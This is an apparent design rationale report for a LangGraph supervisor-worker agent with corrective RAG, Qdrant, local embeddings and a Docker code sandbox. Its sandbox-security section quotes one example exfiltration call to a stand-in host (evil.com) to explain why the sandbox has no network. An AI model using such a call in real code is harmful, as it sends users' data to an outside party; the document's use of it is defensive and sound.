# Design Rationale Report

> Why we built each part the way we did, what alternatives existed, and why they were rejected.

---

## 1. Overall Architecture: Supervisor-Worker Pattern

### What it is
A single Supervisor graph owns the user query. It decomposes the query into a plan of
sub-tasks, then routes each task to a specialized sub-graph (RAG or Code). After all tasks
finish, a Synthesizer merges the results.

### Why this design

**The core problem is task heterogeneity.** A user might ask: *"Research the best sorting
algorithms for large datasets, then write a Python benchmark comparing them."* That is
two fundamentally different operations — information retrieval and code execution — that
need different tools, different prompts, and different error handling. A single flat agent
would need to carry all that complexity in one graph.

**The supervisor pattern solves this by separating concerns:**
- The Supervisor only thinks about *what* to do (planning + routing). It never touches
  Qdrant, Docker, or web search directly.
- Each sub-graph only thinks about *how* to do its specific job. The RAG graph doesn't
  know code exists. The Code graph doesn't know about retrieval.
- This makes each piece independently testable, replaceable, and debuggable.

**Why not a flat multi-agent graph?** In a flat graph, all agents share one state and one
set of edges. Adding a new capability (say, a database query agent) means rewiring the
entire graph. With the supervisor pattern, you just add a new sub-graph and a new routing
condition. The supervisor itself doesn't change.

**Why not a fully autonomous agent (e.g., ReAct loop)?** ReAct agents decide their own
next action at every step. This is powerful but unpredictable — they can loop, waste tokens,
or take unexpected paths. The supervisor's explicit plan gives us *predictable routing*
with a clear iteration cap. The user can see the plan before execution starts. This
matters for a system that will eventually have human-in-the-loop approval.

---

## 2. Task Planning: intake_planner Node

### What it is
An LLM call that takes the user's raw query and outputs a JSON list of typed sub-tasks.
Each task has a description and a type: `research`, `code`, or `hybrid`.

### Why this design

**We need the plan to be structured, not free-text.** The router makes branching decisions
based on task type. If the planner outputs free-form text, we'd need another LLM call to
classify each task. Structured JSON output eliminates that second call and removes
ambiguity.

**Why JSON instead of function calling / tool_use?** Function calling works well but adds
coupling to a specific LLM provider's API. Plain JSON output works with any model that
can follow instructions. Our fallback (if JSON parse fails, treat the whole query as a
single research task) means the system never crashes on malformed output — it degrades
gracefully.

**Why decompose at all? Why not send the whole query to both sub-graphs?**
Because many queries are *sequential* — the code task depends on research results. If you
ask "find the latest GDP data for Japan and plot it," the code can't run until the data is
found. The plan's ordering encodes these dependencies. It also prevents wasting tokens on
unnecessary sub-graph invocations (a pure research question doesn't need the code path).

---

## 3. Router: Conditional Edge Routing

### What it is
A simple function that reads `plan[current_task_index]`, extracts the task type prefix
(`[research]`, `[code]`, `[hybrid]`), and returns a string that LangGraph's conditional
edges use to pick the next node.

### Why this design

**The router is intentionally not an LLM call.** It's pure Python logic — parse a string
prefix, return a routing decision. This is a deliberate choice:
- Zero latency, zero tokens, zero cost per routing decision.
- 100% deterministic — the same plan always routes the same way.
- Trivially testable (5 unit tests, no mocking needed).

**The LLM already made the classification decision** in the planner step. Having the router
re-classify with another LLM call would be redundant and slow.

**The iteration counter is a safety mechanism.** Without it, a malformed plan or a bug in
the sub-graphs could cause infinite loops. The `max_iterations` cap (default 10) guarantees
the graph terminates. When hit, the router signals `done` and the system synthesizes
whatever partial results it has.

---

## 4. Corrective RAG (CRAG) Sub-Graph

### What it is
A retrieval-augmented generation pipeline with self-correction:
1. Retrieve documents from Qdrant
2. LLM grades each document for relevance
3. If relevant: generate answer. If ambiguous: rewrite query and retry. If irrelevant:
   fall back to web search.

### Why CRAG over naive RAG

**Naive RAG (retrieve → generate) has a silent failure mode.** If the retrieved documents
are irrelevant, the LLM will still generate an answer — it will just be wrong or
hallucinated. The user has no way to know the retrieval failed. CRAG adds an explicit
quality check after retrieval. The system *knows* when it doesn't have good sources and
takes corrective action.

**Why CRAG over Self-RAG?** Self-RAG embeds retrieval decisions *inside* the generation
step — the LLM generates tokens, then mid-stream decides whether to retrieve more
documents. This is elegant in theory but:
- Harder to implement as discrete LangGraph nodes (it's inherently a single-step process)
- Harder to debug (the retrieval decision is implicit in the generation)
- More complex prompting with marginal quality improvement for our use case

CRAG's explicit retrieve→grade→decide flow maps perfectly to LangGraph's node+edge model.
Each step is independently observable and testable.

### Why the 3-tier grading (relevant / ambiguous / irrelevant)

**Two tiers (relevant/irrelevant) would be too coarse.** Consider: you retrieve 5 documents
and only 1 is relevant. Is that enough to generate a good answer? Maybe, maybe not.
The "ambiguous" tier captures this middle ground and triggers a query rewrite — a
lightweight corrective action before the heavier web search fallback.

The thresholds are simple: 2+ relevant docs = relevant, 1 = ambiguous, 0 = irrelevant.
This is intentionally unsophisticated. Fancy scoring can come later; what matters now is
that the *control flow exists*.

### Why vector score pre-filtering before LLM grading

The grader calls the LLM once per document. With 5 retrieved docs, that's 5 LLM calls.
The vector score pre-filter (`score < threshold * 0.5`) skips documents that are clearly
irrelevant, saving tokens. If Qdrant returns a doc with cosine similarity 0.2, there's no
point asking the LLM whether it's relevant.

### Why DuckDuckGo instead of Tavily

**Purely practical — no API key available.** Tavily is purpose-built for LLM-augmented
search and returns cleaner results. DuckDuckGo is a general search API with occasional
rate limiting. If a Tavily key becomes available, the swap is a single-node change
(`web_search` in `nodes/rag.py`). The rest of the graph doesn't care where the documents
come from.

---

## 5. Vector Database: Qdrant

### Why Qdrant over alternatives

| Option     | Pros                       | Cons for us                    |
|------------|----------------------------|--------------------------------|
| Qdrant     | Docker-native, good Python SDK, filtering support | External process |
| ChromaDB   | In-process, zero-config    | Weaker at scale, limited filtering |
| Pinecone   | Managed, scalable          | Paid, external dependency      |
| FAISS      | Fast, in-process           | No metadata filtering, no persistence out of box |

**Qdrant wins because:**
- It runs alongside our code sandbox in Docker — one `docker compose up` starts everything
- It persists data to a volume (survives restarts)
- Metadata filtering will be useful later (filter by source, date, topic)
- The Python SDK mirrors the mental model of our search function well

**ChromaDB was the runner-up** but lacks Qdrant's filtering capabilities and has had
stability issues in high-throughput scenarios. For a system that will eventually store
long-term memory across many sessions, Qdrant's architecture is a better fit.

---

## 6. Embeddings: Local sentence-transformers

### Why local over API-based

**Cost and latency.** Every document ingestion and every retrieval query requires an
embedding call. With OpenAI's API, that's a network round-trip and a per-token charge on
every single search. With `all-MiniLM-L6-v2` running locally:
- Zero cost per embedding
- ~5ms per embedding (vs ~200ms for API call)
- No rate limits, no API key needed
- Works offline

**Why `all-MiniLM-L6-v2` specifically?**
- 384-dimension vectors (small, fast to search)
- 80MB model size (loads in <1 second)
- Consistently top-ranked for its size class on MTEB benchmarks
- Battle-tested in production at many companies

**The trade-off:** lower embedding quality than `text-embedding-3-small` (OpenAI). For our
use case — retrieving relevant technical documents from a relatively small corpus — the
quality difference is negligible. If retrieval quality becomes a problem, we can swap the
model by changing one line in `config.py`.

### Why a singleton pattern

The model is 80MB. Loading it on every function call would add ~1 second of latency per
search. The singleton (`_model` global, lazy-loaded on first call) ensures we load once
and reuse.

---

## 7. State Schemas: TypedDict Design

### Why TypedDict over Pydantic or dataclass

**LangGraph's state channels work natively with TypedDict.** Using Pydantic would require
serialization/deserialization at every node boundary. TypedDict is the idiomatic choice
for LangGraph — it's what the framework's `add_messages` reducer expects.

### Why three separate state schemas

Each graph has fundamentally different data needs:
- **SupervisorState** tracks the plan, task index, and aggregated results
- **RAGState** tracks query rewrites, document grades, and retrieval history
- **CodeState** tracks generated code, execution output, and retry counts

Merging them into one schema would mean every node carries fields it never uses. Worse,
it would create namespace collisions (both RAG and Code have a concept of "retry count"
but with different semantics). Separate schemas make each sub-graph self-contained.

### Why `Annotated[list, add_messages]` for messages

LangGraph's `add_messages` reducer intelligently appends new messages to the existing list
(deduplicating by ID if needed). Without it, every node would overwrite the entire message
history. This is critical for maintaining conversation context across multiple node
invocations.

---

## 8. Checkpointer: SQLite

### Why checkpointing at all

**LangGraph graphs can be interrupted and resumed.** This is essential for:
- Human-in-the-loop (Phase 6): pause at `human_review`, wait for user input, resume
- Crash recovery: if the process dies mid-execution, resume from last checkpoint
- Debugging: inspect state at any point in the execution

### Why SQLite over PostgreSQL

**Development simplicity.** SQLite is a single file, zero configuration, included in
Python's standard library. PostgreSQL requires a running server, connection strings, and
migrations. For a single-developer project, SQLite is the right choice.

**The migration path is trivial:** swap `SqliteSaver` for `PostgresSaver` and change
the connection string. The rest of the code doesn't change. We'll do this if/when we
need concurrent access or multi-user support.

---

## 9. Testing Strategy

### Why mock the LLM in tests

**Determinism and cost.** LLM responses are non-deterministic — the same prompt can
produce different outputs on different runs. Tests that call a real LLM are:
- Flaky (might pass today, fail tomorrow)
- Slow (~1-2 seconds per LLM call vs ~1ms for a mock)
- Expensive (every test run burns tokens)

By mocking `_get_llm()` and returning `AIMessage` objects, we test the *graph logic* (did
the right nodes execute in the right order?) without testing the LLM's intelligence.

### Why test all three CRAG paths

The CRAG graph has three distinct execution paths:
1. Relevant → generate (happy path)
2. Irrelevant → web search → generate (fallback path)
3. Ambiguous → rewrite → retrieve → grade → generate (retry path)

Each path exercises different nodes and edges. Testing only the happy path would leave
the corrective behavior — the entire point of CRAG — unverified. The ambiguous path test
specifically verifies that the rewrite loop works (retrieve is called twice, rewrite_count
increments).

---

## 10. Docker Compose for Container Management

### Why compose over manual `docker run`

**Reproducibility.** `docker run` commands with port mappings, volume mounts, and names
are easy to get wrong. Docker Compose encodes the full container configuration
declaratively. `./scripts/start.sh` and `./scripts/stop.sh` make it a single command.

**Future-proofing.** Phase 4 adds a code sandbox container. Phase 7 might add monitoring.
Compose scales to multiple services naturally — you just add another entry. Manual
`docker run` commands don't compose well.

---

## 11. Docker Sandbox: Long-Running Container with `docker exec`

### What it is
A persistent Docker container (`fetcher-sandbox`) running `sleep infinity`. Code is
executed by calling `docker exec` to run a Python command inside the already-running
container.

### Why a persistent container instead of per-execution containers

**Cold start penalty.** Creating a new container per execution takes 500ms–2s (image pull
check, filesystem setup, process launch). The self-correction loop may execute code 3–4
times per task. A persistent container eliminates this overhead entirely — `docker exec`
starts in ~50ms.

**Resource predictability.** One long-running container with `mem_limit: 512m` and `cpus: 1.0`
is easier to reason about than a variable number of short-lived containers competing for
resources.

**The trade-off:** state leaks between executions. If one code run writes a file, the next
run can see it. For our use case this is acceptable — each code task is independent, and
the sandbox runs as a non-root user with limited filesystem access. If isolation between
runs becomes critical, we can add a cleanup step or switch to per-execution containers.

### Why `network_mode: none`

**Security.** The sandbox executes LLM-generated code. If the code contains `requests.get("https://evil.com/exfiltrate?data=...")`,
it should fail silently. Disabling network access is the simplest, most robust defense.

The pre-installed packages (numpy, pandas, matplotlib) all work offline. The only casualty
is `requests`, which we include for data parsing tasks but which cannot make actual HTTP
calls from inside the sandbox. If a task genuinely needs network access, we'd need to
rethink this — but that's a conscious security decision, not a default.

### Why non-root user

Defense in depth. Even without network, the container runs as `sandbox` user rather than
root. This prevents code from modifying system files, installing packages, or escalating
privileges inside the container.

---

## 12. Code Self-Correction: Separate Prompts for First Attempt vs Retry

### What it is
The `coder` node uses two different system prompts: one for the initial generation and one
for retries. The retry prompt includes the previous code and the specific error feedback.

### Why not one prompt with optional error context

**Prompt focus.** When the LLM sees a clean task description, it approaches it from scratch
with full creative latitude. When it sees a task + broken code + error, we want it to
focus narrowly on *fixing the specific error*, not reimagining the approach. Different
prompts produce different LLM behaviors.

**The retry prompt explicitly says "fix the code based on the error."** Without this framing,
the LLM sometimes ignores the error and rewrites from scratch — producing the same bug.
The dedicated prompt keeps it focused on the traceback.

---

## 13. Critic Node: Skip LLM When Execution Already Failed

### What it is
If `exit_code != 0`, the critic immediately returns `is_verified=False` with the stderr
as feedback, without calling the LLM.

### Why this matters

**Token savings.** If Python raises `NameError: name 'x' is not defined`, asking the LLM
"is this output correct?" is a waste. The error is self-evident. Skipping the LLM call
saves ~500 tokens per failed execution. In a 3-retry loop, that's 1500 tokens saved.

**Speed.** Each skipped LLM call saves ~1 second of latency.

The LLM critic is only invoked when code *runs successfully* but might produce *wrong
results* — the harder judgment that requires understanding the task intent.

---

## Decisions I Would Revisit

These are choices that are correct *for now* but may need to change:

1. **gpt-4o-mini for grading**: The document grader uses the cheap model. If grading
   accuracy becomes a bottleneck (too many false positives/negatives), upgrading to gpt-4o
   for just the grader node is a one-line change.

2. **Fixed top-5 retrieval**: We always retrieve 5 documents. For some queries, 3 would
   suffice; for others, 10 would help. Adaptive retrieval (based on query complexity)
   could improve quality and reduce grading costs.

3. **No chunking in ingestion**: `ingest_documents` takes pre-split texts. We don't have
   a chunking strategy yet. When we ingest real documents (PDFs, web pages), we'll need
   to add recursive character splitting or semantic chunking.

4. **Stub-based integration testing**: The supervisor's full-flow test uses stub sub-graphs.
   Once real sub-graphs are wired in (Phase 5), we'll need integration tests that exercise
   the real CRAG and Code paths end-to-end.

5. **Sandbox state leaks**: The persistent container doesn't clean up between runs. If
   tasks start interfering with each other, add a cleanup step (remove temp files) or
   switch to per-execution containers with a warm pool.

6. **Fixed sandbox packages**: Only numpy/pandas/matplotlib/requests are pre-installed.
   If the LLM generates code requiring other packages, it will fail. Options: expand the
   image, add a `pip install` step in the executor, or have the coder prompt list available
   packages.
